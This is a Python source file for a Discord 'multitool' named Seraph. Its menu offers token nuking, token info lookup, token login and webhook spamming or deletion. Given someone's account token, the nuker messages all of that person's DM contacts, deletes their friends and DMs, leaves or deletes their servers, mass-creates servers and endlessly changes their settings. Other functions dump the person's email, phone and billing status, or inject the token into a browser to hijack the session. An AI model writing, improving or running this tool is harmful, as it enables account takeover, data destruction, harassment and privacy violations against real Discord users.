import threading, pypresence, requests, discord, random, time, os, discord_webhook, aiohttp, asyncio, json

from pypresence import Presence
from selenium import webdriver
from datetime import datetime
from itertools import cycle
from discord.ext import commands

try:
    RPC = Presence("802317564679946311") 
    RPC.connect()

    RPC.update(details="Main Menu", large_image="seraph", small_image="seraph", large_text="Seraph Multitool", start=time.time())
except:
    pass

def clearScreen():
    os.system('cls')

def setSize():
    os.system('mode 69,20')

def setTitle():
    os.system('title [Seraph Multitool] - Main Menu')

def setBanner():
    clearScreen()
    print('''
                       \x1b[38;5;33m╔═╗ ╔═╗ ╦═╗ ╔═╗ ╔═╗ ╦ ╦
                       \033[90m╚═╗ ║╣  ╠╦╝ ╠═╣ ╠═╝ ╠═╣
                       \033[37m╚═╝ ╚═╝ ╩╚═ ╩ ╩ ╩   ╩ ╩

         \x1b[38;5;33m╔════════════════════════╦════════════════════════╗
         \x1b[38;5;33m║ \033[37m[\x1b[38;5;33m1\033[37m] \033[37mToken Nuker        \x1b[38;5;33m║ \033[37m[\x1b[38;5;33m4\033[37m] \033[37mWebhook Spammer    \x1b[38;5;33m║
         \x1b[38;5;33m║ \033[37m[\x1b[38;5;33m2\033[37m] \033[37mToken Info         \x1b[38;5;33m║ \033[37m[\x1b[38;5;33m5\033[37m] \033[37mWebhook Deleter    \x1b[38;5;33m║
         \x1b[38;5;33m║ \033[37m[\x1b[38;5;33m3\033[37m] \033[37mToken Login        \x1b[38;5;33m║ \033[37m[\x1b[38;5;33m6\033[37m] \033[37mWebhook Checker    \x1b[38;5;33m║  
         \x1b[38;5;33m╚════════════════════════╩════════════════════════╝\033[37m
''')

clearScreen()
setSize()
setTitle()

guildsIDS = []
friendsIDS = []
privatechannelIDS = []

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIDS.append(g.id)
 
        for f in self.user.friends:
            friendsIDS.append(f.id)

        for pc in self.private_channels:
            privatechannelIDS.append(pc.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            print(f"\n\033[91m>\033[39m Invalid Token")
            time.sleep(2)
            startMenu()

def tokenLogin(token):
    headers = {'Authorization': token}
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')
    driver.get("https://discord.com/api/v8/users/@me/activities/statistics/applications", headers=headers)

def tokenInfo(token):
    clearScreen()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        nitro = False
        payment = False
        r = requests.get("https://discordapp.com/api/v8/users/@me/billing/payment-sources", headers={'Authorization': token})
        if 'id' in r.text:
            payment = True
        else:
            payment = False

        r = requests.get('https://discordapp.com/api/v8/users/@me', headers={"Authorization": token})
        if 'premium_type' in r.text:
            if r.json()['premium_type'] == 0:
                nitro = False
            if r.json()['premium_type'] == 1:
                nitro = True
            if r.json()['premium_type'] == 2:
                nitro = True

        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
 \x1b[38;5;33m- \033[39mUsername   \x1b[38;5;33m[\033[39m{userName}\x1b[38;5;33m]\033[39m
 \x1b[38;5;33m- \033[39mID         \x1b[38;5;33m[\033[39m{userID}\x1b[38;5;33m]\033[39m
 \x1b[38;5;33m- \033[39mEmail      \x1b[38;5;33m[\033[39m{email}\x1b[38;5;33m]\033[39m
 \x1b[38;5;33m- \033[39m2FA        \x1b[38;5;33m[\033[39m{mfa}\x1b[38;5;33m]\033[39m
 \x1b[38;5;33m- \033[39mPhone      \x1b[38;5;33m[\033[39m{phone if phone else "False"}\x1b[38;5;33m]\033[39m
 \x1b[38;5;33m- \033[39mPayment    \x1b[38;5;33m[\033[39m{payment}\x1b[38;5;33m]\033[39m
 \x1b[38;5;33m- \033[39mNitro      \x1b[38;5;33m[\033[39m{nitro}\x1b[38;5;33m]\033[39m
''')
        input()
        startMenu()
    else:
        print(f"\033[91m>\033[39m Invalid Token")
        time.sleep(2)
        startMenu()

def fuck(token, dmMessage, serverAmount, serverName):
    headers = {'Authorization': token}

    try:
        for id in privatechannelIDS:
            r = requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{dmMessage}"})
            if r.status_code == 200 or r.status_code == 204 or r.status_code == 201:
                print(f'\x1b[38;5;33m[\033[37m+\x1b[38;5;33m] \033[37mMessaged: \x1b[38;5;33m{id}\033[37m')
    except:
        pass

    try:
        for friend in friendsIDS:
            r = requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
            if r.status_code == 200 or r.status_code == 204 or r.status_code == 201:
                print(f'\x1b[38;5;33m[\033[37m+\x1b[38;5;33m] \033[37mRemoved Friend: \x1b[38;5;33m{friend}\033[37m')
    except:
        pass

    try:
        for id in privatechannelIDS:
            r = requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
            if r.status_code == 200 or r.status_code == 204 or r.status_code == 201:
                print(f'\x1b[38;5;33m[\033[37m+\x1b[38;5;33m] \033[37mRemoved DM: \x1b[38;5;33m{id}\033[37m')
    except:
        pass

    try:
        for guild in guildsIDS:
            try:
                r = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
                if r.status_code == 200 or r.status_code == 204 or r.status_code == 201:    
                    print(f'\x1b[38;5;33m[\033[37m+\x1b[38;5;33m] \033[37mLeft Guild: \x1b[38;5;33m{guild}\033[37m')
            except:
                r2 = requests.delete(f"https://discord.com/api/v8/guilds/{guild}", headers=headers)
                if r2.status_code == 200 or r2.status_code == 204 or r2.status_code == 201:
                    print(f'\x1b[38;5;33m[\033[37m+\x1b[38;5;33m] \033[37mDeleted Guild: \x1b[38;5;33m{guild}\033[37m')
    except:
        pass

    try:
        for i in range(int(serverAmount)):
            payload = {'name': f'{serverName} {i}', 'region': 'europe', 'icon': None, 'channels': None}
            r = requests.post('https://discord.com/api/v8/guilds', headers=headers, json=payload)
            if r.status_code == 200 or r.status_code == 204 or r.status_code == 201:
                print(f'\x1b[38;5;33m[\033[37m+\x1b[38;5;33m] \033[37mCreated Guild: \x1b[38;5;33m{serverName} {i}\033[37m')
    except:
        pass

    try:
        while True:
            setting = {'theme': next(cycle(["light", "dark"])), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
    except:
        pass

def tokenFuck():
    
    token = input('\x1b[38;5;33m> \033[37mToken\x1b[38;5;33m: \033[37m')
    threads = input('\x1b[38;5;33m> \033[37mThreads\x1b[38;5;33m: \033[37m')
    serverName = input('\x1b[38;5;33m> \033[37mServer Names\x1b[38;5;33m: \033[37m')
    serverAmount = input('\x1b[38;5;33m> \033[37mServer Amount\x1b[38;5;33m: \033[37m')
    dmMessage = input('\x1b[38;5;33m> \033[37mDM Message\x1b[38;5;33m: \033[37m')

    Login().run(token)

    print(f"\n\x1b[38;5;33m[\033[37m!\x1b[38;5;33m] \033[37mNuking...")
    if threading.active_count() < int(threads):
        threading.Thread(target=fuck, args=(token, dmMessage, serverAmount, serverName,)).start()

def webhookSpammer(webhook, username, message, amount, delay):
    payload = {'content': f"{message}", 'username': f"{username}"}
    for i in range(int(amount)):
        r = requests.post(webhook, json=payload)
        time.sleep(int(delay))
        if r.status_code == 200 or r.status_code == 204 or r.status_code == 201:
            print(f"\x1b[38;5;33m[\033[37m!\x1b[38;5;33m] \033[39mSpammed Webhook")

    time.sleep(3)
    startMenu()

def webhookDeleter(webhook):
    requests.delete(webhook)
    check = requests.get(webhook)

    if check.status_code == 404:
        print("\x1b[38;5;33m[\033[37m!\x1b[38;5;33m] \033[37mDeleted Webhook\033[39m")
        time.sleep(2)
        startMenu()
    elif check.status_code == 200:
        print("\x1b[38;5;33m[\033[37m!\x1b[38;5;33m] \033[37mCouldn't Delete Webhook\033[39m")
        time.sleep(2)
        startMenu()

def webhookChecker(webhook):
    webhook_check = requests.get(webhook)

    if webhook_check.status_code == 404:
        print("\033[91m>\033[39m \033[39mWebhook is Invalid\033[39m")
        time.sleep(2)
        startMenu()
    else:
        print("\033[92m>\033[39m \033[39mWebhook is Valid\033[39m")
        time.sleep(2)
        startMenu()

def startMenu():
    clearScreen()
    setBanner()
    choice = input('\x1b[38;5;33m> \033[37mChoice\x1b[38;5;33m: \033[37m')

    if choice == '1':
        tokenFuck()

    elif choice == '2':
        token = input('\x1b[38;5;33m> \033[37mToken\x1b[38;5;33m: \033[37m')
        print()
        tokenInfo(token)
    
    elif choice == '3':
        token = input('\x1b[38;5;33m> \033[37mToken\x1b[38;5;33m: \033[37m')
        tokenLogin(token)

    elif choice == '4':
        webhook = input('\x1b[38;5;33m> \033[37mWebhook\x1b[38;5;33m: \033[37m')
        username = input('\x1b[38;5;33m> \033[37mUsername\x1b[38;5;33m: \033[37m')
        message = input('\x1b[38;5;33m> \033[37mMessage\x1b[38;5;33m: \033[37m')
        amount = input('\x1b[38;5;33m> \033[37mAmount\x1b[38;5;33m: \033[37m')
        delay = input('\x1b[38;5;33m> \033[37mDelay\x1b[38;5;33m: \033[37m')
        print()
        threading.Thread(target=webhookSpammer, args=(webhook, username, message, amount, delay,)).start()

    elif choice == '5':
        webhook = input('\x1b[38;5;33m> \033[37mWebhook\x1b[38;5;33m: \033[37m')
        print()
        webhookDeleter(webhook)

    elif choice == '6':
        webhook = input('\x1b[38;5;33m> \033[37mWebhook\x1b[38;5;33m: \033[37m')
        print()
        webhookChecker(webhook)

    else:
        clearScreen()
        startMenu()
        
if __name__ == '__main__':
    clearScreen()
    startMenu()
